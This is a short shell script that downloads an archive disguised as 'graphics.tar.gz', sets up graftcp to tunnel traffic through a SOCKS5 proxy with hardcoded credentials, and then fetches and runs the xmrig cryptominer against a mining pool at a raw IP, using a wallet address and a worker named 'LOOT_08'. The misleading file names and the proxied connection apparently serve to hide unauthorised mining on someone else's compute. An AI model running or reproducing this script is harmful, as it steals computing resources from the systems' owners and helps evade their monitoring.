#apt-get update -y
wget https://github.com/Melpinoy/Gg/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 209.94.62.246:443

socks5_username = temera8

socks5_password = temera8

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2
./graftcp/graftcp wget https://github.com/Melpinoy/Gg/raw/main/xmrig && chmod +x xmrig

./graftcp/graftcp wget https://github.com/Melpinoy/Gg/raw/main/SHA256SUMS && chmod +x SHA256SUMS


./graftcp/graftcp ./xmrig -o stratum+tcp://34.149.22.228:9200 -u 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.LOOT_08 -p x -a rx/0 -t 4 -k --donate-level 0

